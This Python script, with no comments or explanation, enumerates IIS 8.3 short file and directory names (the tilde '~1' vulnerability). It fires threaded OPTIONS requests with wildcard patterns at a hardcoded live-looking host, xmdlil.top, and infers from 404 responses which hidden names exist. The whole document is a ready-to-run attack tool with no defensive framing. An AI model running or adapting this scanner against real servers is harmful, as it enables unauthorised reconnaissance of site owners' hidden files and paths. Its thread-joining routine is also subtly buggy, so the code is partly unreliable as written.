import requests
from threading import *

S = "qwertyuiopasdfghjklzxcvbnm0123456789_-!@$&"


def scan_1_url(url):
    for i in S:
        a = url + "/%s*~1****/" % i
        # print(a)
        t = Thread(target=handler, args=(a, url_list))
        tlist.append(t)
        t.start()
    t_join()

def scan_url(urls):
    global url_list

    scan_urls = urls
    url_list = []
    for url in scan_urls:
        for i in S:
            a = url[0:-8] + i + url[-8:]
            t = Thread(target=handler, args=(a, url_list))
            tlist.append(t)
            t.start()
    t_join()

def handler(a, ulist):
    try:
        r = requests.options(a)
        if r.status_code == 404:
            mutex.acquire()
            ulist.append(a)
            print(a)
            mutex.release()
    except Exception:
        pass

def handler_file(a, ulist, each):
    global url_list
    try:
        r = requests.options(a)
        if r.status_code != 404:
            mutex.acquire()
            ulist.append(a)
            url_list.remove(each)
            print(a)
            mutex.release()
    except Exception:
        pass

def t_join():
    global tlist
    for t in tlist:
        t.join()
        tlist.remove(t)

def get_url_file(urls):
    global url_list_file
    for each in urls:
        url = each[0:-5] + "/"
        t = Thread(target=handler_file, args=(url, url_list_file, each))
        tlist.append(t)
        t.start()
    t_join()

def scan_1_file(url):
    global url_list_file_temp
    for i in S:
        a = url[0:-1] + "*%s**/" % i
        # print(a)
        t = Thread(target=handler, args=(a, url_list_file_temp))
        tlist.append(t)
        t.start()
    t_join()

def scan_2_file(urls):
    global url_list_file_temp
    urllist = urls
    url_list_file_temp = []
    for url in urllist:
        for i in S:
            a = url[0:-3] + "%s*/" % i
            # print(a)
            t = Thread(target=handler, args=(a, url_list_file_temp))
            tlist.append(t)
            t.start()
    t_join()

def scan_3_file(urls):
    global url_list_file_temp
    urllist = urls
    url_list_file_temp = []
    for url in urllist:
        for i in S:
            a = url[0:-2] + "%s/" % i
            # print(a)
            t = Thread(target=handler, args=(a, url_list_file_temp))
            tlist.append(t)
            t.start()
    t_join()


url_list = []
url_list_file = []
url_list_file_temp = []

tlist = []
mutex = Lock()


def main():
    url = "http://xmdlil.top"
    scan_1_url(url)

    for i in range(0, 5):
        scan_url(url_list)

    get_url_file(url_list)

    for each in url_list_file:
        scan_1_file(each)

    scan_2_file(url_list_file_temp)
    scan_3_file(url_list_file_temp)

    print("********************************************")
    for each in url_list:
        print(each)

    print("********************************************")
    for each in url_list_file_temp:
        print(each)


if __name__ == "__main__":
    main()
